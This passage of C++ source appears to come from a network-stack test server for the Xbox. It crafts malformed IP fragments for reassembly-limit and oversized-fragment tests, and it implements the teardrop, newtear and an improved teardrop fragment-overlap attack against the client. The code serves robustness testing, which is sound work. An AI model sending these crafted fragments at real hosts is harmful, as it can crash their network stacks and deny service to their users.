			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024 + 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1025);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1025, TRUE);
				break;
			}


			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxSimulReassemblyServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 4 datagrams before completing
// any of them (exactly the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxSimulReassemblyServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
				pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
					pUDPPacket->UDPHeader.SetDestPort((pSessionInfo->LowPort + j + MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pSessionInfo->pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
				delete Ex;
				
			}
			
			// Release the packet
			if(pIPPacket)
			{
				(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxSimulReassemblyServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 5 datagrams before completing
// any of them (one above the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxSimulReassemblyServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX + 1; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
				pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
					pUDPPacket->UDPHeader.SetDestPort((pSessionInfo->LowPort + j + ABOVE_MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pSessionInfo->pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
				delete Ex;
				
			}
			
			// Release the packet
			if(pIPPacket)
			{
				(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOversizedFragmentsServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends oversized fragment to try and empty the Xbox buffer
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOversizedFragmentsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[100];

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < OVERSIZED_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset((USHORT) i);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, sizeof(PayloadBuffer), TRUE);

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackTeardropServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original teardrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + TEARDROP_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + TEARDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(TEARDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + TEARDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackNewTeardropServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNewTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + NEWTEAR_SIZE * 2);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + NEWTEAR_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(NEWTEAR_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + NEWTEAR_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackImpTeardropServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the teardrop attack.  This attack consists of
// one IP fragment with offset 0, more-fragments set and a payload of N bytes followed
// by another fragment with offset <N, more-fragments cleared and a payload that when
// added to the offset, is still less than N.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackImpTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 256);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 256 - UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(16);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 64);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'b' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 64, TRUE);
				break;
			}

			// Send the packet
